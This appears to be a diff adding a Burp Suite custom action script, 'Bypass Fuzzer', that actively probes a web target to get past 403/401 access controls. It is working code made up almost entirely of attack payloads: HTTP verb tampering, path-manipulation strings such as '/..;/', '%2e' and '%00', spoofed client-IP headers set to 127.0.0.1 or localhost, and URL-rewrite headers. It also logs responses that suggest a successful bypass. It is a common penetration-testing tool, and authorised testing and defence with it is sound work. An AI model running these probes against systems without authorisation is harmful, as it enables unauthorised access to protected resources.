@@ -1,0 +1,129 @@
+id: 8c3d1e2f-5a6b-7c8d-9e0f-bypassfuzzer01
+name: Bypass Fuzzer
+function: CUSTOM_ACTION
+location: REPEATER
+source: |
+  /**
+   * Comprehensive 403/401 Bypass Fuzzer.
+   * Based on techniques from nomore403 and BypassFuzzer.
+   *
+   * Actively probes the target using Verb Tampering, Path Manipulation, 
+   * and a wide array of Bypass Headers.
+   *
+   * @author bambdas
+   **/
+
+  var request = requestResponse.request();
+  var originalResponse = requestResponse.response();
+  
+  if (originalResponse == null) {
+      logging.logToOutput("[!] Please perform the baseline request first.");
+      return;
+  }
+
+  final int originalStatus = originalResponse.statusCode();
+  final int originalLength = originalResponse.body().length();
+  final String originalMethod = request.method();
+  final String originalPath = request.path();
+  
+  logging.logToOutput("--- Starting Comprehensive Bypass Fuzzer ---");
+  logging.logToOutput("Target: " + request.url());
+  logging.logToOutput("Baseline: " + originalStatus + " (" + originalLength + " bytes)\n");
+
+  // Helper lambda for sending and logging
+  java.util.function.BiConsumer<String, burp.api.montoya.http.message.requests.HttpRequest> sendAndLog = (checkName, req) -> {
+      try {
+          var responseReq = api.http().sendRequest(req);
+          var response = responseReq.response();
+          if (response == null) return;
+          
+          int code = response.statusCode();
+          int length = response.body().length();
+          
+          boolean interesting = false;
+          String statusMark = "";
+          
+          if (code != originalStatus) {
+              interesting = true;
+              if (code >= 200 && code < 300) statusMark = " [SUCCESS?]";
+              else if (code >= 500) statusMark = " [SERVER ERROR]";
+              else statusMark = " [STATUS DIFF]";
+          } else if (originalLength > 0 && Math.abs(length - originalLength) > (originalLength * 0.1)) {
+              interesting = true;
+              statusMark = " [LEN DIFF]";
+          } else if (originalLength == 0 && length > 0) {
+              interesting = true;
+              statusMark = " [LEN DIFF]";
+          }
+          
+          if (interesting) {
+              logging.logToOutput(String.format("%-50s | Status: %d%s | Len: %d", 
+                  checkName, code, statusMark, length));
+          }
+      } catch (Exception e) {
+          // Ignore errors during fuzzing
+      }
+  };
+
+  // --- 1. HTTP Verb Tampering ---
+  String[] methods = {
+      "GET", "POST", "HEAD", "PUT", "DELETE", "CONNECT", "OPTIONS", "TRACE", 
+      "PATCH", "PROPFIND", "PROPPATCH", "MKCOL", "COPY", "MOVE", "LOCK", "UNLOCK"
+  };
+
+  logging.logToOutput("[*] Testing HTTP Verbs...");
+  for (String method : methods) {
+      if (!method.equals(originalMethod)) {
+          sendAndLog.accept("Verb: " + method, request.withMethod(method));
+      }
+  }
+
+  // --- 2. Path Manipulation ---
+  String pathOnly = originalPath;
+  String queryString = "";
+  if (originalPath.contains("?")) {
+      int qIdx = originalPath.indexOf("?");
+      pathOnly = originalPath.substring(0, qIdx);
+      queryString = originalPath.substring(qIdx);
+  }
+
+  String[] pathPayloads = {
+      "/", "//", "/.", "/./", "/..;/", "/.;/", "/%2e/", "/%2e%2e/", "/;/", "/?", "/#",
+      ".json", ".html", ".css", ".js", "%00", "%20", "%09", ";.css", ";.js",
+      "/%2e/..", "/%2f", "/..%2f", "/.%2f", "..;/", "/./"
+  };
+
+  logging.logToOutput("\n[*] Testing Path Manipulation (Suffixes/Injections)...");
+  for (String payload : pathPayloads) {
+      sendAndLog.accept("Path Suffix: " + payload, request.withPath(pathOnly + payload + queryString));
+      
+      if (pathOnly.startsWith("/")) {
+          sendAndLog.accept("Path Prefix: " + payload, request.withPath(payload + pathOnly + queryString));
+      }
+  }
+
+  // --- 3. Header Manipulation ---
+  logging.logToOutput("\n[*] Testing Bypass Headers...");
+
+  String[] ipHeaders = {
+      "X-Forwarded-For", "X-Forwarded-Host", "X-Forwarded-Proto", "X-Forwarded-Port",
+      "X-Real-IP", "X-Remote-Addr", "X-Remote-IP", "X-Client-IP", "X-Host", 
+      "X-Custom-IP-Authorization", "Client-IP", "True-Client-IP", "Forwarded",
+      "CF-Connecting-IP", "X-Originating-IP"
+  };
+
+  String[] ipValues = {"127.0.0.1", "localhost", "::1", "127.1"};
+
+  for (String header : ipHeaders) {
+      for (String val : ipValues) {
+          sendAndLog.accept("Header: " + header + "=" + val, request.withAddedHeader(header, val));
+      }
+  }
+
+  String[] urlHeaders = {"X-Original-URL", "X-Rewrite-URL", "X-Rewrite-Path"};
+  for (String header : urlHeaders) {
+      sendAndLog.accept("URL Header: " + header + "=" + pathOnly, request.withAddedHeader(header, pathOnly));
+      sendAndLog.accept("URL Header: " + header + "=/", request.withAddedHeader(header, "/"));
+  }
+
+  logging.logToOutput("\n--- Fuzzing Complete ---");
